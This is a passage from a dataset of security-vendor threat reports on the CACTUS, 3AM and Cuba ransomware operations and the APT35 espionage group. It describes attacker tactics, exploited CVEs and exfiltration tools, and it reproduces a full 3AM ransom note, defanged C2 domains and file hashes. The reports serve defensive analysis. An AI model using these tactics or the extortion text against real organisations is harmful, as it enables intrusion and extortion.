logistics, and storage experienced notable spikes in ransomware activity.\nDuring Q4 of 2023, two new ransomware strains, CACTUS and 3AM, have emerged.\nCACTUS exploits known vulnerabilities in VPN appliances for initial access, while 3AM serves as a backup for a LockBit affiliate when the primary LockBit strain is blocked on a targeted network.\nThese developments, alongside ongoing ransomware activity this year, highlight the importance of robust security controls across industries to counter the evolving threat of ransomware attacks.\nLet's dive into the specifics of CACTUS and 3AM ransomware strains, along with recommendations for organizations to safeguard against them.\nIn May 2023, Kroll Cyber Threat Intelligence analysts published their discoveries of a new ransomware variant referred to as CACTUS, which has been actively targeting large commercial entities since March 2023.\nThe name \"CACTUS\" is derived from the filename found within the ransom note, cAcTuS.readme.txt, and is also self-declared within the note.\nEncrypted files carry the extension .cts1, although variations in the appended number have been observed across different incidents and victims.\nCACTUS uses a unique tactic by requiring a key for decrypting the binary, likely implemented to evade antivirus detection.\nThis key is embedded within a file named ntuser.dat, loaded through a scheduled task.\nKroll’s research noted instances of data exfiltration and victim extortion over Tox, a peer-to-peer messaging service, but no known victim leak site was identified.\nIn its operations, CACTUS demonstrates a consistent set of tactics, techniques, and procedures (TTPs).\nThe initial exploit involves the exploitation of vulnerable VPN appliances, a prevalent method observed across multiple CACTUS incidents.\nOnce inside the network, the threat actor conducts internal scouting using tools like SoftPerfect Network Scanner and PowerShell commands to enumerate endpoints, identify user accounts, and ping remote endpoints.\nTo maintain persistence, CACTUS deploys various remote access methods, including legitimate tools like Splashtop, AnyDesk, and SuperOps RMM, along with malicious tools like Cobalt Strike and Chisel.\nThe threat actor attempts to disable security software using custom scripts, such as TotalExec, and uninstall common antivirus software.\nImage 1: A Piece of Bath Script to Disable Anti-Virus Source: Kroll Lateral movement is achieved through valid or created accounts, the Remote Desktop Protocol (RDP), and remote management tools like Super Ops.\nFor mission execution, CACTUS employs exfiltration tools like Rclone and deploys a script (TotalExec.ps1) to automate the deployment of the ransomware encryptor.\nThe ransomware binary, named after the victim ID, follows an execution flow controlled by command-line switches, including setup mode, read configuration mode, and encryption mode.\nImage 2: File Encryption Process Source: Kroll CACTUS encrypts files using the AES algorithm and OpenSSL's envelope implementation, appending them with the extension \"cts\\d.\"\nA ransom note named \"cAcTuS.readme.txt\" is created, providing details on negotiation over Tox chat.\nThe ransom amount and the effectiveness of any provided decryptor in case of non-payment remain uncertain.\nIn November 2023, cybersecurity firm Qlik reported instances of attacks exploiting vulnerabilities, specifically CVE-2023-41266, CVE-2023-41265, and CVE-2023-48365, to gain initial access.\nThe threat actors involved tried to deploy CACTUS ransomware on compromised systems.\nPraetorian discovered these vulnerabilities and disclosed details in August and September.\nThe security vulnerabilities, classified as 'critical' and 'high severity,' impact Qlik Sense Enterprise for Windows, a data analytics solution.\nCVE-2023-41266 is identified as a path traversal issue allowing a remote, unauthenticated attacker to generate anonymous sessions and send unauthorized HTTP requests.\nMeanwhile, CVE-2023-41265 is a HTTP tunneling flaw that can allow an attacker to elevate privileges and execute HTTP requests on backend servers hosting repository applications.\nWhen combined, these vulnerabilities allow a remote, unauthenticated threat actor to execute arbitrary code and introduce new admin users to the Qlik Sense application.\nPraetorian researchers assigned CVE-2023-48365 after successfully circumventing the patch for CVE-2023-41265.\nUpon gaining initial access to the targeted organization's systems, the threat actors were seen altering admin account passwords, uninstalling security software, installing remote access software, engaging in data exfiltration, and employing RDP for lateral movement.\nWhile Qlik's initial advisories stated that there was no exploitation of the vulnerabilities in the wild, Arctic Wolf maintained that attacks exploiting the vulnerabilities for remote code execution were observed.\nQlik has since released a statement to Security Week acknowledging that they are conducting an investigation into the reports of exploitation.\nIn December 2023, Microsoft issued a warning about CACTUS ransomware, revealing that attackers are leveraging malvertising through online ads to infect victims.\nThe threat actor behind the campaign, Storm-0216, (also known as Twisted Spider or UNC2198), shifted to using Danabot malware for initial access after receiving handoffs from Qakbot operators, whose infrastructure was dismantled by law enforcement in August 2023.\nDanabot, observed since November, operates with a private version of info-stealing malware, collecting user credentials and information sent to command and control.\nCACTUS has become increasingly prevalent in attacks on industrial organizations, impacting manufacturing and ICS equipment.\nIn a recent incident involving a construction company, threat actors faced difficulty in deploying LockBit ransomware on the target network, leading them to resort to a newly identified ransomware variant known as 3AM.\nSymantec's Threat Hunter Team uncovered the incident, where a LockBit affiliate attempted to initiate a LockBit attack on the network but shifted to 3AM when LockBit deployment was thwarted.\n3AM, written in Rust, represents an entirely new malware family.\nBefore file encryption, it attempts to halt various services on the infected system and then proceeds to eliminate Volume Shadow (VSS) copies.\nThe ransomware's authors and potential ties to known cybercrime organizations remain uncertain.\nThe attack preparation phase involves suspicious activities such as using the gpresult command to extract enforced policy settings and executing Cobalt Strike components for privilege escalation.\nReconnaissance commands like whoami, netstat, quser, and net share are deployed, with the goal of lateral movement and adding a new user for persistence.\nThe attackers also utilize the Wput tool to exfiltrate victim files to their FTP server.\nDespite initial attempts to deploy LockBit, the attackers pivot to 3AM, which only achieves partial success.\nDuring the incident, it was deployed on three machines in the organization's network but was blocked on two out of three computers.\nNamed after its file extension, .threeamtime, and referencing the time in its ransom note, 3AM encrypts files, adding a marker string \"0x666\" to the encrypted data.\nThe ransom note, emphasizing mysticism at 3 am, outlines the encryption and data theft, proposing negotiation via a Tor browser link.\nThe malware's execution involves various command-line parameters, with specific commands attempting to stop security and backup-related software before initiating file encryption.\n3AM attempts to delete Volume Shadow backup copies and exhibits signs of being used as a backup when the primary ransomware attack fails.\nImage 3: Ransom Note | Hello. \"\n3 am\" The time of mysticism, isn't it?\nAll your files are mysteriously encrypted, and the systems \"show no signs of life\", the backups disappeared.\nBut we can correct this very quickly and return all your files and operation of the systems to original state.\nAll your attempts to restore data by himself will definitely lead to their damage and the impossibility of recovery.\nWe are not recommended to you to do it on our own!!! (\nor do at your own peril and risk).\nThere is another important point: we stole a fairly large amount of sensitive data from your local network: financial documents; personal information of your employees, customers, partners; work documentation, postal correspondence and much more.\nWe prefer to keep it secret, we have no goal to destroy your business.\nTherefore can be no leakage on our part.\nWe propose to reach an agreement and conclude a deal.\nOtherwise, your data will be sold to DarkNet/DarkWeb.\nOne can only guess how they will be used.\nPlease contact us as soon as possible, using Tor-browser: http://threeam7[REDACTED].onion/recovery Access key: [32 CHARS SPECIFIED BY -k COMMAND LINE PARAMETER] | The cybersecurity landscape is witnessing a transformative phase as cybercriminals, particularly ransomware affiliates, adopt more sophisticated strategies.\nThe spotlight on Qlik, with vulnerabilities affecting over 40,000 customers, emphasizes the severity of the situation.\nZoomEye's data, revealing 17,000 exposed instances of Qlik Sense, magnifies the need for robust cybersecurity measures.\nCACTUS ransomware's targeted operations since March 2023, exploiting VPN appliance vulnerabilities, highlight the evolving tactics of cybercriminals.\nThe introduction of 3AM as a backup plan in LockBit cyber attacks adds a layer of complexity, indicating a strategic approach among threat actors.\nWhile 3AM's current deployment is limited, its utilization as a fallback suggests a potential interest from attackers and the ransomware could be used again in the near future.\nOrganizations must remain vigilant, using multifaceted defense strategies to keep their information safe.\nPlease see the following recommendations on how to keep your organization safe from Cactus and 3AM: CACTUS 3AM How Avertium is Protecting Our Customers It’s important to get ahead of the curve by being proactive with protecting your organization, instead of waiting to put out a massive fire.\nAvertium can provide the following services to help keep your organization safe from ransomware strains such as CACTUS and 3 AM: CACTUS 3AM CACTUS 3AM A Deep Dive Into Cactus Ransomware Whitepaper | SecurityScorecard Cactus ransomware exploiting Qlik Sense flaws to breach networks (bleepingcomputer.com) Protection Bulletins (broadcom.com) CACTUS ransomware | Cyber Threat Intelligence | Kroll Cactus Ransomware Report - Quorum Cyber Q3 Ransomware Report: Global Ransomware Attacks Up More Than 95% Over 2022 (corvusinsurance.com) Qlik Sense Vulnerabilities Exploited in Ransomware Attacks - SecurityWeek DoubleQlik: Bypassing Original Fix for CVE-2023-41265 - (praetorian.com) Qlik Sense Remote Code Execution Technical Exploitation - (praetorian.com) When LockBit Ransomware Fails, Attackers Deploy Brand-New '3AM' (darkreading.com) Malvertising leveraged to distribute Cactus ransomware | SC Media (scmagazine.com) Qlik Sense flaws exploited in Cactus ransomware campaign - Help Net Security Microsoft warns of Cactus ransomware actors using malvertising to infect victims (therecord.media) This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.","num_sentences":83,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"cactus"}}
{"id":5,"title":"An In-Depth Look at APT35 aka Charming Kitten","publish_date":"2022-02-28","link":"https://www.avertium.com/resources/threat-reports/in-depth-look-at-apt35-aka-charming-kitten","clean_text":"Executive Summary The Iranian advanced persistent threat actor and cyberespionage group, APT35, also known as Charming Kitten or Phosphorus, has been making headlines since 2014.\nDuring that time, the group launched one of the most sophisticated internet based spying campaigns organized by Iranian threat actors – a campaign conducted via social media.\nSince then, the group has not slowed down and has been responsible for several other cyber attacks around the world.\nIn 2019, APT35 was responsible for targeting several academic institutions in the U.S, France, and the Middle East region.\nIn late 2020, the group targeted medical research organizations in Israel and in the U.S. By 2021, APT35 was abusing Microsoft Exchange Server vulnerabilities that were chained together (ProxyShell).\nAs of 2022, APT35 has been observed using new tactics to attack a wide range of targets.\nUsing a new strain of malware, the threat actors were able to use the malware for intelligence collection.\nThe group has also been seen using a new tool called Hyperscrape to quietly extract emails from victim’s mailboxes.\nLet’s take a look at APT35, their tactics and techniques, and what a tool like Hyperscrape can do for an advanced persistent threat actor like APT35.\nNote: APT35 and Charming Kitten will be used interchangeably throughout this report.\nAs previously mentioned, Charming Kitten has been on the radar of the infosec community since 2014 despite being active since 2013.\nOver the past few months, the Cybereason Nocturnus Team has observed an uptick in activity from the Iranian APT.\nCharming Kitten was previously known for attacking medical research organizations in the U.S. and in Israel, using malicious PDFs to lure their victims and they have continued to include the medical sector in their attacks.\nIn 2020, researchers discovered Charming Kitten targeting a small but specific group of people in the medical research field – particularly oncology, genetics, and neurology.\nThe threat actors used a spear-phishing technique and sent emails to their victims with the subject line “Nuclear Weapons at a Glance: Israel.”\nThe emails contained information about Israel’s nuclear capabilities and a link to a malicious website which was controlled by the threat actors.\nOnce the victim clicked on the email, they were taken to a phishing page that asked them to enter their Microsoft OneDrive credentials.\nThe campaign was known as “BadBlood” and was highly targeted – a typical campaign for APTs in general.\nIt is not unusual for Charming Kitten’s phishing campaigns to target a select number of people, but it is unusual for Iranian APTs as a whole.\nIt is suspected that Charming Kitten is associated with Iran’s Islamic Revolutionary Guard Corps due to the group’s targeting and collection aligning with the entity.\nIn 2019, Microsoft’s Digital Crimes Unit took over the infrastructure of APT35.\nAt the time, APT35 was responsible for spear-phishing campaigns against several individuals and organizations (activists, journalists, defense companies, etc.).\nThe takedown included a court order for Microsoft to assume control of 99 domains that belonged to APT35 and that the group used during their phishing campaigns.\nMost of the domains looked as if they belonged to Microsoft or other legitimate technology companies.\nThe emails associated with the campaigns contained links that eventually lead to the installation of malware and the domains were used as a part of the command-and-control infrastructure of the group.\nIn addition to attacking journalists and medical professionals, APT35 has used their malware to gain entry into computer systems for businesses and government agencies to steal sensitive information.\nHowever, the group especially had an interest in activists and journalists involved in advocacy and reporting on issues in the Middle East. “\nThe action we executed last week enabled us to take control of 99 websites and redirect traffic from infected devices to our Digital Crime Unit’s sinkhole.\nThe intelligence we collect from this sinkhole will be added to MSTIC’s existing knowledge of Phosphorus and shared with Microsoft security products and services to improve detections and protections for our customers.” -\nTom Burt – Corporate Vice President of Customer Security & Trust for Microsoft APT35 is still active despite the 2019 takedown, and in February 2022, the group was seen using a new toolset that included a novel backdoor, malware loaders, a browser info stealer, and a keylogger.\nThey were also seen using open-source tools such as the DiskCryptor library, BitLocker, and Fast Reverse Proxy.\nAPT35 was seen deploying a new PowerShell Backdoor called PowerLess Backdoor and they were using a stealthy technique to avoid detection.\nThe PowerShell Backdoor was being run in a .NET context instead of spawning the PowerShell process.\nThe PowerLess Backdoor supports the following capabilities: While analyzing, security experts from Cybereason noticed several grammatical mistakes in the backdoor’s code, suggesting that English was likely not the native language of the backdoor’s authors.\nCybereason also found links between the APT35 and Momento Ransomware – a ransomware group that initially appeared in 2021.\nMomento exploited CVE-2021-21972 – a VMware vCenter Server vulnerability that could be exploited by remote attackers without user interaction.\nThere were several similarities between the TTPs used by APT35 and Momento ransomware, such as shared URL directory patterns and similar file naming schemes.\nAccording to Sophos, Momento ransomware features a unique failsafe mechanism that locks files inside password-protected WinRAR archives.\nThis is done in case the main file encryption operation fails.\nImage 1: Memento Ransomware Attack Chain Source: Sophos Iranian groups such as APT35, typically operate as contractors on behalf of the Iranian government and scan the web for popular servers that may be vulnerable due to undisclosed vulnerabilities.\nOnce they find the vulnerable servers, they gain control over unpatched systems.\nIf the compromised networks are of interest to the Iranian government, the threat actor will deploy malware and glean information from the compromised systems – ensuring that they maintain persistence for future collection efforts.\nIf the target doesn’t have value, APT35 will sell access to the target’s systems on underground forums, or the target will be monetized for the threat actor.\nIn January 2022, APT35 was seen exploited the Log4Shell/Log4j security vulnerability, seeing it as a new opportunity to strike before organizations patched their affected systems.\nWhen Log4Shell emerged, researchers observed the threat actor performing widespread scans just four days after the vulnerability was disclosed.\nAt the tail end of December 2021, Log4Shell took cyberspace by surprise and had cybersecurity professionals panicking.\nLog4Shell is a zero-day critical vulnerability that was found in the Apache Log4j2 Java-based logging library.\nAlthough conversation regarding Log4Shell has diminished, the vulnerability is still an issue for organizations and remains a permanent threat.\nSince the vulnerability was publicized, over 80% of Log4Shell’s exploitation attempts originated within the U.S. Because many systems are still using older versions of Log4j, the problems continue to escalate.\nAPT35 exploited Log4Shell via JNDI Exploit Kits – a publicly available open-source tool that has since been removed from GitHub due to its popularity following Log4Shell.\nThrough analysis, Checkpoint observed that APT35 linked to their malware infection on their victim’s machines for as long as it took for them to achieve their goal.\nAfter their goal was achieved, they would disappear without a trace.\nAs of August 2022, Charming Kitten was observed using a new tool called Hyperscrape to extract emails from their victims’ mailboxes.\nThe tool allows the threat actors to extract emails from Yahoo!,\nGoogle, and Microsoft Outlook.\nHyperscrape is written for Windows systems in .NET and is run on the threat actor’s computer.\nOnce the thereat actor has possession of valid email credentials or a valid session cookie, Hyperscrape quietly extracts emails from the victim’s mailbox.\nGoogle’s initial analysis of Hyperscrape indicated that the tool was deployed against Iranian accounts, ostensibly to collect information of Iranian dissidents.\nAvertium’s Cyber Threat Intelligence Team (CTI) was able to analyze a sample of Hyperscrape.\nThis tool set is not meant to be used on remote machines, and therefore does not attempt to obfuscate its strings.\nThe fact that it is easily caught and quarantined by Windows Defender is not a deterrence.\nIt is the harvested credentials that matter.\nImage 2: Hyperscrape - Base64 Encoded IP Image 3: Hyperscrape Image 4: Hyperscrape Source: Avertium Cyber Threat Intelligence Team Hyperscrape checks its connectivity to a particular command control server after it is executed from a folder with specific file dependencies.\nHyperscrape then terminates if there is no connectivity.\nNext, it opens a form to specify parameters if everything is okay.\nOnce the parameters are provided, data is sent to the command and control for confirmation.\nFollowing this action, a new form appears and APT35 provides a valid cookie file unless it was provided via command line.\nAfter starting an embedded web browser, Hyperscrape stores the cookies in a local cache used by the browser.\nThe browser is configured to look like it is outdated.\nNext, the browser navigates to the targeted email server (Gmail, Outlook, etc.).\nWhen using Hyperscrape, all emails are saved locally in a Downloads folder with the filename corresponding to the email subject.\nAfter the emails are dumped, Hyperscrape sends status and system information to the command-and-control server before deleting any security emails from the targeted email server.\nEarlier versions of Hyperscrape, allowed APT35 to download data from Google TakeOut, which is a service for customers to download data from Good Documents, Google Calendar, Gmail, and more.\nAfter researchers analyzed the tool, they found that functionality may differ for Microsoft and Yahoo!\naccounts.\nIn July 2022, researchers found that APT35 had an additional tool that they used to target Telegram accounts.\nThe tool needed access to the victim’s email box to be successful, so it’s suspected that APT35 operates Hyperscrape before using the email data for compromising tools such as the Telegram account dump.\nIn the hands of an APT like Charming Kitten, Hyperscrape is a dangerous tool.\nHowever, it’s only successful when the threat actor is already in possession of valid credentials or a valid session cookie of their victim’s mailbox.\nThe way this threat actor obtains credentials and session cookies in the first place is not known.\nFortunately, it is quite difficult for threat actors to collect session cookies by way of other means other than using malware.\nThis fact is why users should ensure that their security software is always up to date and patched on their devices.\nAnother way to keep your environment secure is by using multi-factor authentication to access mailboxes.\nIf your second channel of authentication is one that a threat actor cannot access, your systems and networks will be that much more secure.\nKeeping your operating system and software up to date/patched will also help ensure that you won’t be compromised by a known vulnerability.\nAPTs like Charming Kitten can gain unlimited access to networks and systems, furthering reconnaissance.\nAvertium is here to keep your organization safe and to mitigate any attacks caused by Charming Kitten and other APTs: APT35 aka Charming Kitten Avertium IoCs for Hyperscrape SHA256sum MD5sum SHA1sum IP Addresses Hyperscrape SSDEEP Other IoCs | § 00b5d45433391146ce98cd70a91bef08 | | § 07fb3f925f8ef2c53451b37bdd070b55 | | § 0a3f454f94ef0f723ac6a4ad3f5bdf01 | | § 0e3cb289f65ef5faf40fa830ac9b1bf6 | | § 1c00fd5e1ddd0226bd854775180fd361 | | § 1db12ec1f335ee5995b29dea360514a2 | | § 20f2da7b0c482ab6a78e9bd65a1a3a92 | | § 253b4f5c6611a4bc9c7f5269b127c8e9 | | § 276befa70cff36860cd97e3e19f10343 | | § 30124b5c56cecf2045abd24011bdf06b | | § 3261d45051542ab3e54fa541f132f899 | | § 356439bfb9b2f49858897a22dd85df86 | | § 365482f10808ddd1d26f3dc19c41c993 | | § 3bb2f304a59255dddc5ef6bb0a32aec7 | | § 3c01793380fbd3f101603af68e96f058 | | § 3edec580845d7ab85fa893afb391fbfb | | § 5e9a458dcdfc9d2ce996081ec87c30e0 | | § 5ec9f484603b89f80f351bb88279ebb1 | | § 60753796905458fa6a4407f48309aa25 | | § 6bd505616e12e3dd7f2287f24f34609f | | § 6cfa579dd1d33c2fa42d85c2472f744c | | § 7df3a83dfcce130c01aabede3cfe8140 | | § 7e1cf48d84e503499c9718c50e7a1c52 | | § 9c7ae44baf8df000bb614738370d1171 | | § 9d0e761f3803889dc83c180901dc7b22 | | § a43b7cc495741248f3647e647f776467 | | § a9117da1cb51adbc88a52a6e3b16a6c4 | | § ae797446710e375f0fc9a33432d64256 | | § af5c01a7a3858bc3712ab69bc673cec4 | | § bd0a6fe7a852fdd61c1da37cf99103d2 | | § be207941ce8a5e212be8dde83d05d38d | | § bfd21f2847c1d7aa0f409ef52ed52e05 | | § c7760dc8f7baf67f80ab549af27df9e9 | | § c96453247ee1ecbd4053da8bbb4cf572 | | § ccaf21e122ca9d2e2397a9e28eb4cc87 | | § d6ea39e1d4aaa8c977a835e72d0975e3 | | § d6fa439f0278babb1edff32d8dc31c59 | | § da1f6a5f2a5564c2131b4a311c55f487 | | § e7dd9b8fe7ae14faad304d139f71b629 | | § e93992f26f224ea53d9bdd9564e8e1c0 | | § edd4011696ddd349575278aed7031a47 | | § f5763b8b796b1c5d04febcc65f853967 | | § f7f9806af42adb80d100e55f35cfa86c | | § f9255e0d492eb20df1e78ccc970b121a | | § fac158623b0e3ed3bea6e24b1795cb95 | | § 07a36f5080c69ee38554d89ee112168a25ae4ab7 | | § 09c84dfaa0cc98df0e6be7da5822ccb8e40ed7ba | | § 09f7e481298386e5ff6fe6bcd89c3eeecd3a3186 | | § 1454f00690cf4229e2cd9125bec2eba4dc913c1b | | § 1ac5d658da42413c4e087bb45193f855a140835a | | § 282aa9ed59cf097836accb7e04c60677aa156d4e | | § 29175a0015909186f69f827630ef3fe2c1c5302c | | § 2c650247e410fdcc0ac8e3d363adf12c18f3730c | | § 317628615d85dcab0a46343d3ad0709de5286f12 | | § 453305beccbb0eae70771ca37a5f419ab673b471 | | § 479e1e02d379ad6c3c7f496d705448fa955b50a1 | | § 4b1673e0aafb32b279f26ee295fd876b6fc77654 | | § 4c06518abfa767095e18074f7cca42874b18b4dc | | § 4f2e8efdb11a2b34447fd3770762b94c3d33a2e3 | | § 610fac8675cb9df3af83449ccdb814052a7f66c3 | | § 670078a71f121f8a1d1386750991a87669837e92 | | § 67bb83bbe82ffa910386216619c5ebf9eecf13e6 | | § 6cacf83033fa97f4ac27eb27e4aa265afa4dc51d | | § 7649c554e87f6ea21ba86bb26ea39521d5d18151 | | § 7c9a685581feb04a73edeac69e2ec0db34df5d11 | | § 7f6f48c9fb0e8ab8dae274430e9fd4f7e166ad7c | | § 8408ff6d145302607c4c4922004c5b33ca23563e | | § 8a898c8654b1aaf945ed093d29f81c69ad734588 | | § 8da1630e72857008a8ce59d855f44179c25f5086 | | § 904bd36b6d3eac4121a24e21631f8813fd83023a | | § 9b59a840cd2e8fd6f14755c78e5b9f35fe9456c5 | | § a064008b89e572851bf4ff12ab8142cfd436503b | | § a2f17906ca39e7f41a8adeea4be5ffb7d1465c4a | | § b030729cbcbc045528fb13df8c57f1d2a385e176 | | § b5cf1dcd8f4bff9d618924f58cca26ccfb740c59 | | § ba2ea7dd2fa220862e397d64bd842a57eb26bf14 | | § c184aa43cff0140e17b3030ff5a3454d966a3c2e | New Iranian APT data extraction tool (blog.google) Charming Kitten - AlienVault - Open Threat Exchange Iranian Hackers Target Nuclear Experts, US Officials (darkreading.com) Remain Vigilant: Log4Shell Still Being Exploited (avertium.com) Iranian cyberespionage group uses Hyperscrape to extract emails (techrepublic.com) Iranian state-sponsored group APT35 linked to Memento ransomware - The Record by Recorded Future Experts warn of a spike in APT35 activity and a link to Memento opSecurity Affairs APT35 Executes PowerShell-Based Malware in Log4j Flaw Attacks | Decipher (duo.com) New steps to protect customers from hacking - Microsoft On the Issues Microsoft Got 99 Domains Used to Phish Someone | Decipher (duo.com) PowerLess Trojan: Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage (cybereason.com) Iranian cyberespionage group uses Hyperscrape to extract emails (techrepublic.com) https://blog.google/threat-analysis-group/new-iranian-apt-data-extraction-tool/ https://www.mei.edu/publications/iranian-apts-overview This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.\nCOPYRIGHT: Copyright © Avertium, LLC and/or Avertium Tennessee, Inc. | All rights reserved.","num_sentences":91,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"charming-kitten"}}
{"id":6,"title":"An In-Depth Look at Cuba Ransomware","publish_date":"2021-11-28","link":"https://www.avertium.com/resources/threat-reports/an-in-depth-look-at-cuba-ransomware","clean_text":"Case Study: INTERNOVA TRAVEL GROUP Discover how Avertium helps unburden Internova Travel Group's security team to have the space to start focusing on more strategic cybersecurity priorities.\nCuba ransomware first appeared in 2019 but remained relatively unnoticed until November 2021, when they reportedly targeted a minimum of 49 organizations across various sectors.\nThe sectors included government, healthcare, information technology, manufacturing, and finance.\nDuring this time, Cuba ransomware operators were infiltrating networks by encrypting files using the “.cuba” extension.\nOver the years, the ransom demands from Cuba totals at least $145 million, and the group has successfully collected at least $60 million in ransom payments.\nBy 2022, the threat actors had expanded their tactics, techniques, and procedures (TTPs), leading security researchers to suggest a potential connection between Cuba ransomware actors, RomCom Remote Access Trojan (RAT) actors, and Industrial Spy ransomware actors.\nThis month, Cuba garnered attention when they took responsibility for a cyberattack on The Philadelphia Inquirer.\nThe purported attack resulted in temporary disruptions to the newspaper's distribution and certain business operations.\nAs we delve into Cuba's latest attacks, tactics, and techniques, it is important to assess how ransomware can disrupt business operations.\nIn December 2021, the Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency issued a joint advisory regarding Cuba ransomware.\nAccording to the advisory, the group successfully targeted a minimum of 49 entities across critical infrastructure sectors, including finance, government, healthcare, manufacturing, and information technology.\nCuba ransomware was being distributed through Hancitor malware, a loader known for deploying stealers like Remote Access Trojans (RATs) and various types of ransomware onto victims' networks.\nThe actors behind Hancitor used phishing emails, exploit Microsoft Exchange vulnerabilities, compromised credentials, or used legitimate Remote Desktop Protocol (RDP) tools to gain initial access to the victim's network.\nOnce inside, the ransomware actors utilized legitimate Windows services, including PowerShell, PsExec, and other unspecified services, along with Windows Admin privileges, to execute their ransomware and other processes remotely.\nThe compromise of a victim network was achieved through the encryption of targeted files, with the \".cuba\" extension.\nIn October 2022, the Ukrainian authorities warned about a new ransomware group that was targeting organizations in the country.\nThe unknown group was actually Cuba, and they were sending members of the Ukrainian government spoofed phishing emails that appeared to be sent from the “Press Service of the General Staff of the Armed Forces of Ukraine”.\nWhen recipients fell for the scam and clicked on the link provided in the email, they were directed to a webpage where they were encouraged to download a new version of PDF Reader.\nUnfortunately, this action triggered the execution of a malicious executable.\nRunning the mentioned file decoded and executed the 'rmtpak.dll' file, which was identified as RomCom malware.\nPalo Alto Networks originally discovered RomCom in August 2022.\nTheir research connected this remote access Trojan (RAT) to a newly associated Cuba ransomware affiliate called \"Tropical Scorpius”, confirming that Cuba allows threat actors to carry out various post-intrusion activities, including data exfiltration.\nTropical Scorpius played a significant role in Cuba ransomware infections, accounting for almost half of the victims listed on the group's leak site from 2019 to the summer of 2022.\nPalo Alto reported that Cuba ransomware successfully targeted 27 more organizations, including sectors like state and local government, transportation and logistics, utilities and energy, education, healthcare, and others.\nThis information suggests that Cuba's operations in Ukraine were mainly driven by financial motives, rather than being coordinated with the objectives of the Russian state.\nThe Chilean government also became a victim of Cuba ransomware in 2022.\nThe government’s Microsoft and VMware ESXi servers were targeted by the group.\nAfter encrypting the servers and renaming all files with “.crypt”, the group took complete control of the victim’s system and left a ransom note behind with a way to contact them.\nIn January 2023, in a private threat analytics report, Microsoft stated that Cuba ransomware operators were infiltrating unpatched Microsoft Exchange servers via a critical server-side request forgery (SSRF) vulnerability.\nThe vulnerability was tracked as CVE-2022-41080 and was also used by Play ransomware.\nRackspace, a cloud computing provider, verified that Play ransomware successfully exploited CVE-2022-41080, compromising servers on Rackspace’s network by bypassing ProxyNotShell URL rewrite mitigations.\nThe flaw was initially abused by the ransomware group in late November 2022.\nAlthough Microsoft released security updates on November 8, 2022, to resolve the SSRF Exchange vulnerability, and shared information with some customers regarding its exploitation by ransomware groups, the official advisory was not updated to clearly warn about active exploitation in the wild.\nIn May 2023, Cuba ransomware took credit for the recent cyber-attack on The Philadelphia Inquirer, causing a temporary disruption in the newspaper's distribution and impacting certain business activities.\nThe breach was disclosed on May 14, 2023, and The Inquirer was forced to take its systems offline.\nThe attack disrupted the distribution of The Inquirer's Sunday newspaper, making the disruption the most significant since the Blizzard of 1996.\nImage 1: Cuba Publishes Stolen Files Source: Gridinsoft Although the Inquirer’s CEO, Lisa Hughes, stated that they have not seen evidence of The Inquirer’s data being shared online, Cuba claimed the cyber attack on their extortion site and the newspaper’s data was allegedly officially released by the gang.\nThe data included source code, financial documents, account movements, tax documents, and more.\nHowever, the group has since removed the listed data, which could mean two things: they initiated negotiations and paid the ransom, or the leaked files didn’t belong to the victim.\nBrett Callow, a threat analyst at Emsisoft, stated that it’s too early to determine the exact reason why Cuba chose to remove the listing from the extortion site.\nFirst observed in late 2019, Cuba ransomware is a file-encrypting ransomware that is typically distributed through Hancitor.\nIt is notorious for adding the \".cuba\" extension to the encrypted files.\nAccording to the FBI, since 2021, Cuba ransomware operators have demanded a minimum of $145 million in ransom payments and it is estimated that they may have already received over [1]$60 million from their victims.\nThe gang has compromised 101 entities, 65 being within the United States and 36 outside the United States. [\n1] aa22-335a-stopransomware-cuba-ransomware.pdf (cisa.gov) In December 2021, the FBI reported on Cuba’s tactics and techniques.\nTo gain initial access to organizations in critical infrastructure sectors, Cuba leveraged the following techniques: legitimate remote desktop protocol (RDP) tools, compromised credentials, phishing campaigns, and exploiting known vulnerabilities in commercial software.\nUpon compromise, Cuba installed and executed a Cobalt Strike beacon-as-a-service on the victim’s network via PowerShell.\nOnce installed, the ransomware downloaded two executable files, which included “pones.exe” for password acquisition and “krots.exe,” also known as KPOT, enabling the Cuba ransomware actors to write to the compromised system’s temporary (TMP) file.\nOnce the TMP file was uploaded, the “krots.exe” file was deleted and the TMP file was executed in the compromised network.\nThe TMP file included Application Programming Interface (API) calls related to memory injection that, once executed, deleted itself from the system.\nUpon deletion of the TMP file, the compromised network communicated with a malware repository located at Montenegro-based Uniform Resource Locator (URL) teoresp[.]com.\nAdditionally, Cuba ransomware actors used MimiKatz malware to steal credentials, and then used RDP to log into the compromised network host with a specific user account.\nOnce the RDP connection was complete, Cuba used the Cobalt Strike server to communicate with the compromised user account.\nOne of the initial PowerShell script functions allocated memory space to run a base64-encoded payload.\nOnce this payload was loaded into memory, it was used to reach the remote command-and-control (C2) server and then deployed the next stage of files for the ransomware.\nThe remote C2 server is located at the malicious URL kurvalarva[.]com.\nHowever, since the spring of 2022, Cuba’s operators have modified their tactics and techniques, as well as their tools.\nAccording to Palo Alto Networks, Cuba has exploited known vulnerabilities and weaknesses, using various tools to escalate privileges on compromised systems: Palo Alto Networks also stated that Cuba uses specific tools to evade detection as they move laterally through compromised environments before ultimately executing the ransomware.\nThe threat actors utilize a dropper that generates a kernel driver named ApcHelper.sys, which is designed to target and terminate security products.\nAlthough the dropper itself is unsigned, the kernel driver is signed using the certificate obtained from the LAPSUS NVIDIA leak.\nCuba also uses double extortion, demanding a ransom payment in exchange for data decryption.\nThey also threaten to publicly disclose stolen data in the ransom is not paid.\nA ransomware attack can cause significant harm to an organization or business.\nIn addition to lost work time, a ransomware attack can cause an organization reputational damage, as well as legal and regulatory penalties for failing to protect data.\nWhat most organizations fail to realize is that by the time ransomware begins encrypting files, the damage has already 